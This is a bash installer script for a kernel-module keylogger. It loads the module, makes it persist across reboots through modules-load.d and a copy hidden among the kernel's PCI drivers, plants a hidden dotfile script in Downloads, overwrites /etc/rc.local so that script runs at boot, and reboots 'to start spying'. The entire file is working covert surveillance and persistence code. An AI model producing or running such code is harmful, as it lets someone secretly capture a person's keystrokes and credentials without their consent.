#!/bin/bash

#starts the key logger now
sudo insmod keyLogger.ko

# Make it resilent to reboot
sudo bash -c  'echo keyLogger >> /etc/modules-load.d/keyLogger.conf'
sudo cp ./keyLogger.ko /lib/modules/$(uname -r)/kernel/drivers/pci
sudo depmod

# Create the script to copy and put it in boot sequence
cp ./read.sh ~/Downloads
mv ~/Downloads/read.sh ~/Downloads/.read.sh

# Change the rc.local file to enable running the script on start up
sudo cp ./rc.local /etc/rc.local
sudo chmod +x /etc/rc.local

# Restart Computer to start spying
shutdown -r 0
